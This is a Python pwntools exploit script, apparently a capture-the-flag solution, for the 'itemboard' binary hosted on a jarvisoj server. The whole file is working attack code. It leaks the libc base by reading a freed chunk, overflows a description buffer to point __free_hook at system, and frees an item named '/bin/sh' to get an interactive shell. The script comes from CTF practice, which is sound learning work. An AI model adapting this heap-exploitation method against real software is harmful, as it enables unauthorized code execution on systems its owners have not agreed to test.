#!/usr/bin/env python

from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

local = 0

if local:
    cn = process('./itemboard')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    cn = remote("pwn2.jarvisoj.com", 9887)
    libc = ELF('./libc-2.19.so')

bin = ELF('./itemboard')


def new_item(name, length, des):
    cn.recvuntil('choose:')
    cn.sendline('1')
    cn.recvuntil('Item name?')
    cn.sendline(name)
    cn.recvuntil('len?')
    cn.sendline(str(length))
    cn.recvuntil('Description?')
    cn.sendline(des)

def list_item():
    cn.recvuntil('choose:')
    cn.sendline('2')
    print cn.recvuntil('1.')

def show_item(num, ans='Description:'):
    cn.recvuntil('choose:')
    cn.sendline('3')
    cn.recvuntil('Which item?')
    cn.sendline(str(num))
    cn.recvuntil(ans)


def delete_item(num):
    cn.recvuntil('choose:')
    cn.sendline('4')
    cn.recvuntil('Which item?')
    cn.sendline(str(num))

def z():
    gdb.attach(cn)
    raw_input()
# leak libc_base
new_item('0',0x80,'aaaa')
new_item('1',0x80,'bbbb')

delete_item(0)

if local:
    show_item(0)
    data = u64(cn.recv(6).ljust(8,'\x00'))
    libc_base = data-0x3c4b78
    free_hook_ptr =libc_base + 0x3C3EF8
    system = libc_base + libc.symbols['system']
else:
    show_item(0)
    data = u64(cn.recv(6).ljust(8,'\x00'))
    libc_base = data-0x3BE7B8
    free_hook_ptr =libc_base + 0x3BDEE8
    system = libc_base + libc.symbols['system']

success("libc_base: " + hex(libc_base))
success("free_hook_ptr: " + hex(free_hook_ptr))
success("system: " + hex(system))

pay = p64(system) 
pay +='a'*(1024 + 8-len(pay))
pay += p64(free_hook_ptr-8)

new_item('/bin/sh\x00',len(pay),pay)

delete_item(2)

cn.interactive()
